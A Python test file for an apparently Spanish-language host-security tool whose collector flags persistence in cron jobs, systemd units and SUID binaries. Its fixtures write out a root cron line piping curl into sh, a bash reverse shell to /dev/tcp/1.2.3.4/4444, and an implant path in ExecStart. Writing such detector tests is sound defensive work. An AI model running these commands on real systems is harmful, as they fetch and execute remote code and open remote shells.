"""Tests del colector de persistencia (SUID/cron/systemd)."""
import os

from centinela.collectors.persistence import PersistenceCollector


def _mk(path, content):
    with open(path, "w") as f:
        f.write(content)
    return str(path)


def test_grep_detecta_curl_pipe_sh(tmp_path):
    p = _mk(tmp_path / "c", "* * * * * root curl http://x/a | sh\n")
    assert "curl" in PersistenceCollector._grep_bad(p)


def test_grep_detecta_reverse_shell(tmp_path):
    p = _mk(tmp_path / "c", "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n")
    assert PersistenceCollector._grep_bad(p) is not None


def test_grep_ignora_comentarios_y_limpio(tmp_path):
    p = _mk(tmp_path / "c", "# curl http://x | sh\n0 5 * * * root /usr/bin/backup\n")
    assert PersistenceCollector._grep_bad(p) is None


def test_grep_only_filtra_execstart(tmp_path):
    cont = "[Service]\nExecStart=/tmp/.implant\nDescription=curl | sh\n"
    p = _mk(tmp_path / "u.service", cont)
    # Con filtro ExecStart, solo la línea ExecStart cuenta (la Description no).
    hit = PersistenceCollector._grep_bad(p, only=("ExecStart",))
    assert hit and "ExecStart" in hit


def test_suid_bad_location(tmp_path):
    if os.name == "nt":
        return
    b = tmp_path / "x"
    b.write_text("x")
    st = os.lstat(b)
    # Una ruta bajo /tmp es mala ubicación; /usr/bin/sudo no lo es.
    assert PersistenceCollector._suid_bad_location("/tmp/evil", st) is True
    assert PersistenceCollector._suid_bad_location("/usr/bin/sudo", st) is False
    assert PersistenceCollector._suid_bad_location("/usr/bin/.hidden", st) is True


def test_suid_nuevo_se_detecta_contra_baseline(tmp_path):
    if os.name == "nt":
        return
    b = tmp_path / "bin"
    b.write_text("x")
    os.chmod(b, 0o4755)        # SUID
    st = os.lstat(b)
    w = PersistenceCollector(bus=None)
    # Primer escaneo: fija baseline (ubicación legítima simulada) -> sin alerta.
    w._iter_suid = lambda: iter([("/usr/bin/legit", st)])
    assert w._scan_suid(now=1000.0) == []
    # Aparece un binario SUID NUEVO -> alerta crítica.
    w._iter_suid = lambda: iter([("/usr/bin/legit", st),
                                 ("/usr/bin/newdoor", st)])
    evs = w._scan_suid(now=2000.0)
    assert len(evs) == 1 and "NUEVO" in evs[0].message


def test_available_sin_etc_en_windows():
    w = PersistenceCollector(bus=None)
    assert w.available() == (os.name == "posix" and os.path.isdir("/etc"))
